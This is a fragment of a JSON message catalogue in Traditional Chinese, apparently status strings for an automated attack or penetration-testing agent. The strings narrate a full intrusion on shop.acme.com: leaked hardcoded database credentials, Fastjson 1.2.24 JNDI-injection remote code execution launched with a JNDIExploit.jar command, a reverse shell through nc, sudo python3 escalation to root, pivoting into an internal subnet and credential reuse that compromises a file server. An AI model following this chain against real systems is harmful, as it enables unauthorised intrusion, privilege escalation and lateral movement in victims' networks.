  "m2614": "原始碼外洩與硬編碼 DB 憑證已確認；憑證已記錄至圖譜供後續內部檢查。",
  "m2615": "shop.acme.com 是自訂商店。先對框架/元件版本進行指紋識別，再評估已知的反序列化元件。",
  "m2616": "Java 技術棧；/api/import 接受 JSON 主體。",
  "m2617": "錯誤堆疊包含 com.alibaba.fastjson.JSONException（1.2.24）",
  "m2618": "Fastjson 1.2.24 已確認；關聯 JdbcRowSetImpl JNDI 注入 RCE。",
  "m2619": "Fastjson 1.2.24 指紋確認存在反序列化 RCE 攻擊面；交由利用 intent 處理。",
  "m2620": "為 shop 回呼啟動 JNDI/LDAP 服務以載入 payload。先用 dnslog 驗證出口，再建立反彈 shell。",
  "m2621": "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 啟動 LDAP/HTTP payload 服務",
  "m2622": "Payload 服務就緒。",
  "m2623": "已收到 LDAP 請求 → ReverseShell 已載入 → nc 監聽器已連線",
  "m2624": "Payload 觸發成功。",
  "m2625": "id; hostname -I  # 在 reverse shell 中確認身分與子網",
  "m2626": "www-data@dmz-web01 具第二張介面 10.10.10.x；已建立與內部網路相鄰的 DMZ 存取。",
  "m2627": "反序列化 RCE 取得 www-data 反彈 shell；目標 3 的初始落腳點已建立。",
  "m2628": "www-data 權限有限。檢查 sudo 設定、SUID 檔案與核心版本以進行本機提權。",
  "m2629": "Python3 在 sudo 允許清單中免密碼；可直接提權。",
  "m2630": "已提權至 root。",
  "m2631": "本機 root 提權完成；已確保落腳點供內部樞紐使用。",
  "m2632": "落腳點可直接觸及 10.10.10.0/24。使用內部主機/連接埠發現來識別網域控制站與高價值主機。",
  "m2633": "已識別 DC01 網域控制站、FS01 檔案伺服器與內部 Jenkins。",
  "m2634": "內部發現完成；3 個高價值目標已加入圖譜。",
  "m2635": "外洩的 sa/Acme@2021 是 DB 密碼；組織常重複使用憑證。在 DC01/FS01/JENKINS 上測試重用。",
  "m2636": "FS01 [+] acme.local\\\\\\\\sa:Acme@2021 (Pwn3d!)\\nDC01 [-] 驗證失敗",
